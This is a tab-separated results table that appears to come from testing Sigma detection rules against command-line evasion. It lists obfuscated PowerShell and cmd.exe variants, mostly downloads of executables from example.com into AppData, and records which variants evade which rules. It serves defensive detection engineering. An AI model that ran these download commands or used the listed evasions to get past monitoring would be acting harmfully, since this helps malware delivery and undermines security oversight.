Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe /""nop"" /""noni"" -w 1 -exec bypass -Command ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -NOP -noni -W 1 -exec bypass -c ""Write-Host 'Test'"""	TRUE	TRUE	FALSE	Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Write-Host 'Test'"""	TRUE	TRUE	FALSE	Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -""NoProfile"" -NonInteractive -WinDOwsTYle Hidden -ep Bypass /""Command"" ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -nop /""NonInteractive"" -""WindowStyle"" Hidden /""ExecutionPolicy"" Bypass -c ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -""NoProfile"" /""NonInteractive"" -""WindowStyle"" Hidden -""ExecutionPolicy"" Bypass -""Command"" ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -nop -NoNiNTeRActIVe -""WindowStyle"" Hidden -EXECUtionpOLIcY Bypass -""Command"" ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -""NoProfile"" -nOniNteRacTivE -""WindowStyle"" Hidden -EXECuTIONpOlIcy Bypass -c ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -nop -""NonInteractive"" -""WindowStyle"" Hidden -""ExecutionPolicy"" Bypass /""Command"" ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe /""NoProfile"" /""NonInteractive"" -WINDOWsTYLE Hidden /""ExecutionPolicy"" Bypass -c ""Write-Host 'Test'"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB...	TRUE	TRUE	FALSE	Suspicious Encoded PowerShell Command Line (ca2092a1-c273-4878-9b4b-0d60115bf5ea); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -noProFiLe -exEcUtiOnpOLicy Bypass -WInDowStyLe Hidden /""EncodedCommand"" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB..."	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -nOPRofiLe -ExeCuTionpOlicy Bypass -winDoWSTYle Hidden -""EncodedCommand"" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB..."	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -NOpRoFIle /""ExecutionPolicy"" Bypass /""WindowStyle"" Hidden /""EncodedCommand"" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB..."	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -NOproFile -EXEcuTiOnpOLiCY Bypass -""WindowStyle"" Hidden -EnCOdEdcomMaNd UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAIABDAHQAZQB..."	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe /c ""curl -o %A^ppData%\test.exe h^t^t^p://[example.com/test.exe]()"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe /C ""curl -o %A^ppData%\test.exe h^t^t^p://[example.com/test.exe]()"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe /""c"" ""curl -o %A^ppData%\test.exe h^t^t^p://[example.com/test.exe]()"""	TRUE	TRUE	FALSE	Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		cmd.exe /c curl -o %USERPROFILE%\AppData\Roaming\test.exe http://example.com/test.exe	TRUE	TRUE	FALSE	Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		cmd.exe /C curl -o %USERPROFILE%\AppData\Roaming\test.exe http://example.com/test.exe	TRUE	TRUE	FALSE	Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe /c curl -""o"" %USERPROFILE%\AppData\Roaming\test.exe http://example.com/test.exe"	TRUE	TRUE	FALSE	Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		cmd.exe /C curl -O %USERPROFILE%\AppData\Roaming\test.exe http://example.com/test.exe	TRUE	TRUE	FALSE	Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe /""c"" curl -o %USERPROFILE%\AppData\Roaming\test.exe http://example.com/test.exe"	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe -""c"" curl -o %USERPROFILE%\AppData\Roaming\test.exe http://example.com/test.exe"	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe /c curl /""o"" %USERPROFILE%\AppData\Roaming\test.exe http://example.com/test.exe"	TRUE	TRUE	FALSE	Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"powershell.exe -Command ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"powershell.exe -""Command"" ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"powershell.exe -c ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"powershell.exe -COmmANd ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"powershell.exe /""Command"" ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"powershell.exe -cOmMAnD ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"powershell.exe -CoMMaND ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand <BASE64_PAYLOAD>	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -ep Bypass /""NoProfile"" -wINdoWStyLE Hidden -enCODEDCOMmaND <BASE64_PAYLOAD>"	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe /""ExecutionPolicy"" Bypass /""NoProfile"" -ws Hidden -""EncodedCommand"" <BASE64_PAYLOAD>"	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -""ExecutionPolicy"" Bypass -NOPROfIlE -ws Hidden -ENcodedcoMMaNd <BASE64_PAYLOAD>"	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe /""ExecutionPolicy"" Bypass -nop -WiNdoWsTYLe Hidden -EncOdedcommanD <BASE64_PAYLOAD>"	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		powershell.exe -EXECUTIonPOliCY Bypass -NOPrOFiLe -ws Hidden -enCOdEDcOmmaND <BASE64_PAYLOAD>	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe /""ExecutionPolicy"" Bypass -noPRoFile /""WindowStyle"" Hidden -enc <BASE64_PAYLOAD>"	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe /""ExecutionPolicy"" Bypass -nop -ws Hidden -enc <BASE64_PAYLOAD>"	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -""ExecutionPolicy"" Bypass -NoProfILe -windOWstYLe Hidden -EncODEdCOMmANd <BASE64_PAYLOAD>"	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		powershell.exe -ep Bypass -nop -ws Hidden -eNcoDEDcommaND <BASE64_PAYLOAD>	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_hktl_crackmapexec_execution_patterns	HackTool - CrackMapExec Execution Patterns	058f4380-962d-40a5-afce-50207d36d7e2		"powershell.exe -exECUtIOnPOlicY Bypass -nop /""WindowStyle"" Hidden -""EncodedCommand"" <BASE64_PAYLOAD>"	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe /c ""curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\file.exe"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe /C ""curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\file.exe"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe /""c"" ""curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\file.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe -""c"" ""curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\file.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe /c ""set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe /C ""set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"cmd.exe -""c"" ""set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%"""	TRUE	TRUE	FALSE	Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"powershell.exe -Command ""Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile $env:APPDATA\payload.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"powershell.exe -cOmMand ""Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile $env:APPDATA\payload.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"powershell.exe -c ""Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile $env:APPDATA\payload.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"powershell.exe -CommaNd ""Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile $env:APPDATA\payload.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"powershell.exe /""Command"" ""Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile $env:APPDATA\payload.exe"""	FALSE	FALSE	FALSE	
t1059.003	proc_creation_win_cmd_http_appdata	Command Line Execution with Suspicious URL and AppData Strings	1ac8666b-046f-4201-8aba-1951aaec03a3		"powershell.exe -CommAnD ""Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile $env:APPDATA\payload.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
